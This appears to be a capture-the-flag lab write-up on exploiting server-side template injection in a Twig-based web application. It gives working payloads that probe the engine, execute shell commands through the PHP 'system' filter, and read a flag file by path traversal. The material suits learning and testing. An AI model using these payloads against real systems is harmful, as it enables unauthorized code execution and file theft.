# Exploiting SSTI - Twig

Exploit the SSTI vulnerability to obtain RCE and read the flag.

In this exercise the web application is running the Twig template engine, so lets focus on its specific payloads to retrieve the flag.

<figure><img src="../../../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>

Lets try to get some information with this payload:

```twig
{{ _self }}
```

<figure><img src="../../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

And its working! Now lets work on the payload.

Lets try to use the PHP built-in function `system`:

```twig
{{ ['id'] | filter('system') }}
```

<figure><img src="../../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

As we can see we manage to execute the `id` command on the webserver. Now all we have to do is to work on the payload to retrieve the flag. We can use this one:

```twig
{{ ['cat ../../../flag.txt'] | filter('system') }}
```

<figure><img src="../../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

And we did it!
